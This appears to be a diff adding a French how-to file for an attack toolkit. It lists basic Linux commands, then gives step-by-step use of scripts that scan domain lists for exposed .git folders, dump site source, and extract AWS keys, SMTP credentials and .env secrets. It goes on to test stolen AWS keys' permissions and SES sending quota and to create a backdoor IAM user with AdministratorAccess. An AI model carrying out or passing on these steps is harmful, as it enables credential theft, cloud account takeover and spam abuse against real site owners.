@@ -1,0 +1,48 @@
+cd <lenomdudossier>: se deplacer dans un dossier, revenir en arriere : "cd .."
+ls [ledossier]: lister les fichiers
+cat <lefichier> : afficher le contenu d'un fichier
+nano <lefichier>: editeur de texte : pour les raccourcis clavier voir google (nano linux tutorials)
+rm -rf <lefichier ou ledossier>: supprimer un dossier/fichier completement
+mkdir <lenomdudossier>: creer un dossier
+touch <lenomdufichier>: creer un fichier
+editer un fichier : nano <lenomdufichier>
+afficher le nombre de lign d'un fichier : wc -l <lefichier>
+supprimer un dossier; rm -rf <ledossier>
+del expl:(http or https or other); sed -i "s/^<à del>:\/\///g" <fichier.txt>
+
+(plus d'aide sur google "apprendre les commandes de base linux")
+---------------------------
+partie exploit :
+cd ~/gitconfig/
+1) lister les sites vulns:
+"nohup python3 vuln.py <liste_ndd.txt> &" : ("nohup <la commande> &" = lancer en arriere plan)
+
+pour savoir si c'est encore en train de tourner : "ps aux | grep 'vuln.py'"
+si ya la ligne python3 vuln.py(en rouge) <ndd.txt> c'est que ca tourne encore
+
+UNE FOIS VULN.PY FINIS :
+
+2) exploiter les sites vulns une fois le premier script terminé:
+( donner les droits d'execution du script avec la commande "chmod +x GoGitDumper/GoGitDumper" )
+(pour installer git) "sudo apt-get install git -y"
+2.1) lancer l'exploit avec :
+"nohup bash dumper.sh gitrez.txt &" : (dump le code source du site vulnerable)
+
+3) dump les smtp depuis les sources:
+cd ~/gitconfig/src/
+"nohup bash finder.sh &"
+les resultats sont dans akia.txt pour les aws, smtp.txt pour les smtp, gigaenv.txt pour les .env
+
+
+4) checker si clefs AWS a des perms : (tout d'abord faire "sudo apt-get install awscli")
+aws configure
+(rentrer l'access key) (ce qui commmence par akia)
+(rentrer la private key)
+(rentrer la region, sinon us-east-1 par default)
+(entrer)
+checker si ya des perms : "aws iam list-users"
+checker combien peut send le aws : "aws ses get-send-quota" => si ca te plait : "bash ~/gitconfig/create_ses_password.sh <secret_key>"
+4.1) si ya des perms creer un user comme ca :
+aws iam create-user --user-name <luser_name_que_tu_veux> && aws iam attach-user-policy --user-name <luser_name_que_ta_mis> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws iam create-login-profile --user-name <luser_name_que_ta_mis> --password "Un_paSSword_r0bustE"
+
+question: Sezyo#1234 sur Discord
